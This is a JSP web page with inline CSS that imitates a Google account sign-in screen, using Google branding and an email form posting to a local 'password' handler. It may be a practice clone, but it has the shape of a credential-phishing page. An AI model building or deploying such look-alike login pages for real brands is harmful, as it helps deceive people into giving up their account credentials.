<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" >
<style type="text/css">
body {
	background-color: #FF8A65
}

h2, h3 {
	font-family: Serif;
}

a {
	margin-top: 10px;
	
}

img {
	border-width: 10px;
	box-sizing: border-box;
}

img:hover {
	background-color: black;
	color: white;
}

input[type] {
	margin-top: 10px;
	width: 350px;
	padding: 8px;
	box-sizing: border-box;
	background: transparent;
	border-width: 0px;
	border: none;
	border-bottom: 2px solid blue;
}

button {
	margin-top: 10px;
	margin-left: 300px;
	color: white;
	background-color: #03A9F4;
	padding: 10px;
	border-radius: 6px;
	box-sizing: border-box;
	cursor:pointer;
}

button:hover {
	background-color: #3F51B5;
}

.flex-container {
	display: -webkit-flex;
	display: flex;
	-webkit-flex-direction: column;
	flex-direction: column;
	 border-top-left-radius: 2em;
	  border-top-right-radius: 2em;
	  border-bottom-left-radius: 2em;
	  border-bottom-right-radius: 2em;
	width: 500px;
	height: 600px;
	margin-top: 6%;
	margin-left: 29%;
	background-color: #FBE9E7;
	box-sizing: border-box;
	
}

.flex-item {
	background-color: #FBE9E7;
	flex-direction: column;
	margin-top: 5px;
	margin-left: 50px;
	box-sizing: border-box;
}

#text {
	margin-top: 10px;
	color: #2196F3;
}

#spaces {
	margin-top: 120px;
}
</style>
<title>Sign in-Google Account</title>
</head>
<body>
	<div class="flex-container">
		<form action="password" method="post">

			<div id="spaces">
				<div class="flex-item" id="google">
					<img src="googleImg.png" height="30" alt="Google" class="image" />
				</div>
				<div class="flex-item" id="signin">
					<h2>Sign in</h2>
					<h3>with your Google Account</h3>
				</div>
				<div class="flex-item" id="signin">
					<input type="email" name="email" placeholder="Email"
						required="required" />
				</div>
				<div class="flex-item">
					<a href="forgotEmail.jsp"><label id="text" Style=cursor:pointer;>Forgot email?</label></a>
				</div>
				<div class="flex-item">
					<button type="submit">NEXT</button>
				</div>
				<div class="flex-item">
					<label id="text" style="">Other Options</label> <a href="register">Register</a>
				</div>
			</div>
		</form>
	</div>

</body>
</html>